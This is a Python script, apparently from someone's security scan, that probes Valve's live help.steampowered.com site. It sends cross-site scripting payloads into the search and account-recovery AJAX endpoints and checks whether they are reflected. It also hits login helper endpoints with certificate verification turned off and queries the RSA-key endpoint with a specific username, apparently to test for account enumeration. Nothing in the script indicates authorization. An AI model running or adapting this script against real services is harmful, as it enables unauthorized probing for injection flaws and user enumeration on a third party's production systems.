# -*- coding: utf-8 -*-
"""help3 深入:AjaxSearchResults 内容反射 + AccountRecoveryGetNextStep redirect 可控性"""
import re
import sys
import json
import ssl
import http.cookiejar
import urllib.parse
import urllib.request

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
BASE = "https://help.steampowered.com"


def make_opener():
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(
        urllib.request.HTTPSHandler(context=CTX),
        urllib.request.HTTPCookieProcessor(cj))
    op.addheaders = [('User-Agent', UA)]
    op.open(BASE + "/en/", timeout=15).read()
    sid = [c.value for c in cj if c.name == 'sessionid'][0]
    return op, sid


def req(op, url, method="GET", data=None, extra_headers=None):
    headers = {'User-Agent': UA}
    if extra_headers:
        headers.update(extra_headers)
    r = urllib.request.Request(url, headers=headers, method=method, data=data)
    try:
        resp = op.open(r, timeout=20)
        return resp.status, resp.read().decode('utf-8', 'replace'), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace'), dict(e.headers)
    except Exception as e:
        return 0, str(e), {}


def main():
    op, sid = make_opener()
    ck = f'sessionid={sid}'

    print("=" * 70)
    print("[H] AjaxSearchResults POST 内容与反射")
    print("=" * 70)
    # 正常搜索
    s, b, h = req(op, BASE + "/en/wizard/AjaxSearchResults/", method="POST",
                  data=urllib.parse.urlencode({'text': 'csgo'}).encode(),
                  extra_headers={'Cookie': ck, 'Content-Type': 'application/x-www-form-urlencoded'})
    print(f"text=csgo -> {s} {h.get('Content-Type')} len={len(b)}")
    try:
        j = json.loads(b)
        print("  keys:", list(j.keys()))
        html = j.get('html', '')
        print(f"  html len={len(html)}")
        # 搜索结果结构
        for m in re.finditer(r'<a[^>]*href="([^"]*)"[^>]*>', html):
            print("   link:", m.group(1)[:120])
        open(r'D:\scan\_valve_help\search_ajax.html', 'w', encoding='utf-8').write(html)
    except Exception as e:
        print("  JSON 解析失败:", e, b[:200])

    # 反射测试
    payloads = ['XV"><script>alert(1)</script>', 'XV" onmouseover=alert(1)', '<svg/onload=alert(1)>',
                'csgo', 'a"&<>']
    for p in payloads:
        s, b, h = req(op, BASE + "/en/wizard/AjaxSearchResults/", method="POST",
                      data=urllib.parse.urlencode({'text': p}).encode(),
                      extra_headers={'Cookie': ck, 'Content-Type': 'application/x-www-form-urlencoded'})
        raw = b.count(p)
        ent = b.count(p.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;'))
        enc = b.count(urllib.parse.quote(p, safe=''))
        print(f"text={p!r:45s} -> {s} 原始{raw} 实体{ent} URL编码{enc} | body头: {b[:100]!r}")

    print()
    print("=" * 70)
    print("[I] AjaxAccountRecoveryGetNextStep redirect 可控性")
    print("=" * 70)
    # 基准请求
    base_params = {'s': 'AAAA', 'account': '0', 'reset': '0', 'issueid': '0', 'lost': '0'}
    for label, mod in [
        ('基准', {}),
        ('account=payload', {'account': 'XV"><script>alert(1)</script>'}),
        ('reset=payload', {'reset': 'XV"><script>alert(1)</script>'}),
        ('issueid=payload', {'issueid': 'XV"><script>alert(1)</script>'}),
        ('lost=payload', {'lost': 'XV"><script>alert(1)</script>'}),
        ('s=payload', {'s': 'XV"><script>alert(1)</script>'}),
        ('account=999', {'account': '999999999'}),
        ('issueid=999', {'issueid': '999999'}),
    ]:
        params = dict(base_params)
        params.update(mod)
        s, b, h = req(op, BASE + "/en/wizard/AjaxAccountRecoveryGetNextStep", method="POST",
                      data=urllib.parse.urlencode(params).encode(),
                      extra_headers={'Cookie': ck, 'Content-Type': 'application/x-www-form-urlencoded'})
        print(f"--- {label} -> {s} ---")
        print(f"    {b[:260]!r}")

    print()
    print("=" * 70)
    print("[J] 登录辅助端点")
    print("=" * 70)
    for url in ['/en/login/getrsakey/', '/en/login/getmenuactions/', '/en/login/rendercaptcha/?gid=',
                '/en/login/setlanguage/', '/en/login/logout/', '/en/wizard/RefreshCaptcha',
                '/en/wizard/AjaxPackagePurchaseReceipt/', '/en/wizard/AjaxVerifyShippingAddress',
                '/en/wizard/AjaxMarkGiftRefundable/', '/en/wizard/AjaxCheckPasswordAvailable/']:
        if 'setlanguage' in url or 'logout' in url or 'RefreshCaptcha' in url:
            # POST 类
            s, b, h = req(op, BASE + url, method="POST",
                          data=urllib.parse.urlencode({'language': 'schinese', 'sessionid': sid}).encode(),
                          extra_headers={'Cookie': ck, 'Content-Type': 'application/x-www-form-urlencoded'})
        else:
            s, b, h = req(op, BASE + url, extra_headers={'Cookie': ck})
        print(f"{url} -> {s} ct={h.get('Content-Type','')} body={b[:150]!r}")

    # getrsakey POST 带用户名(用不存在的用户名避免用户枚举问题)
    s, b, h = req(op, BASE + "/en/login/getrsakey/", method="POST",
                  data=urllib.parse.urlencode({'username': 'xvtestuser987654'}).encode(),
                  extra_headers={'Cookie': ck, 'Content-Type': 'application/x-www-form-urlencoded'})
    print(f"getrsakey POST username=xvtestuser987654 -> {s} body={b[:200]!r}")
    s, b, h = req(op, BASE + "/en/login/getrsakey/", method="POST",
                  data=urllib.parse.urlencode({'username': 'gabelogannewell'}).encode(),
                  extra_headers={'Cookie': ck, 'Content-Type': 'application/x-www-form-urlencoded'})
    print(f"getrsakey POST username=gabelogannewell -> {s} body={b[:200]!r}")


if __name__ == '__main__':
    main()
